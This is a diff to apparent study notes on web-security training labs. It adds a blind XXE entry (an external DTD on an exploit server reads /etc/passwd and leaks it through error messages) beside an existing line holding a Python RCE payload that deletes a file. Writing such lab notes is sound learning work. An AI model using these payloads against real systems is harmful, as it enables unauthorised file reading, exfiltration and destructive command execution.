@@ -301,3 +301,12 @@ websocket, dom-xss, cache-poisoning, clickjacking
     - RCE payload: __import__('os').popen('rm /home/carlos/morale.txt').read()
     - No delimiter breakout needed - direct code context
     - Triggered by posting blog comment
+
+### XXE (5)
+62. Exploiting blind XXE to retrieve data via error messages
+    - Host malicious DTD on exploit server
+    - DTD: %file reads /etc/passwd, %error embeds in invalid path
+    - Trigger FileNotFoundException with file content in error
+    - Payload: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "DTD-URL">%xxe;]>
+    - Extracted users: peter, carlos, user, elmer, academy
+    - Key: Parameter entity nesting for error-based exfiltration
